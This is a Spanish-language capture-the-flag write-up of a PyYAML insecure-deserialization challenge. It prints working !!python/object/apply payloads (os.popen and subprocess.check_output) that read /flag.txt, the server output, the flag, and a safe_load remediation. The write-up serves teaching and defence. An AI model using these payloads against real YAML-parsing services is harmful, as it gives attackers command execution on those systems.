
---
# YAML Ain't Safe — Writeup

|**Categoría**|Web/Deserialización|
|**Dificultad**|Fácil|
|**Plataforma**|fluidattacks.ctf.ae|
|**Flag**|`flag{d09b079b167d2bde}`|

![[Pasted image 20260704075029.png]]

## 🧭 TL;DR

La aplicación convierte YAML a JSON usando PyYAML con `yaml.load()` (inseguro). Al enviar un tag `!!python/object/apply:subprocess.check_output` se ejecuta código arbitrario en el servidor, permitiendo leer `/flag.txt`.

---

## 🔍 Contexto

Aplicación web (Flask) que convierte YAML a JSON usando **PyYAML**. El propio footer del sitio confirmaba la stack: _"Built with PyYAML and Flask"_.

## 🐛 Vulnerabilidad

PyYAML, cuando se usa con `yaml.load()` (sin especificar `Loader=yaml.SafeLoader`), soporta tags especiales como `!!python/object/apply` que permiten **instanciar y ejecutar cualquier objeto o función de Python** directamente desde el YAML de entrada — no solo estructuras de datos seguras (dict, list, str, etc.).

Esto es una **deserialización insegura** clásica: el parser confía ciegamente en el contenido del YAML y ejecuta código arbitrario al intentar construir el objeto Python correspondiente al tag.

### Payloads probados

```yaml
!!python/object/apply:os.popen
args: ['cat /flag.txt']
```

```yaml
!!python/object/apply:subprocess.check_output
args: [['cat', '/flag.txt']]
```

## 🛠️ Explotación

**Payload usado:**

```yaml
!!python/object/apply:subprocess.check_output
args: [['cat', '/flag.txt']]
```

**Cómo funciona:**

- `!!python/object/apply:subprocess.check_output` le dice a PyYAML: "instancia esto llamando a la función `subprocess.check_output`"
- `args: [['cat', '/flag.txt']]` son los argumentos posicionales que se le pasan a esa función — en este caso, una lista de comandos (`cat /flag.txt`)
- Al parsear el YAML, PyYAML ejecuta efectivamente:

```python
subprocess.check_output(['cat', '/flag.txt'])
```

- El resultado (bytes del archivo) se serializa y se devuelve como parte del JSON de salida.

**Resultado obtenido:**

```
"b'flag{d09b079b167d2bde}\\n'"
```

## 🚩 Flag

```
flag{d09b079b167d2bde}
```

## 🩹 Causa raíz

Uso de `yaml.load()` en vez de `yaml.safe_load()` (o `yaml.load(data, Loader=yaml.SafeLoader)`). `safe_load()` restringe la deserialización solo a tipos de datos Python básicos y nunca permite instanciar objetos arbitrarios ni ejecutar funciones.

## ✅ Remediación

```python
# Inseguro
data = yaml.load(user_input)

# Seguro
data = yaml.safe_load(user_input)
```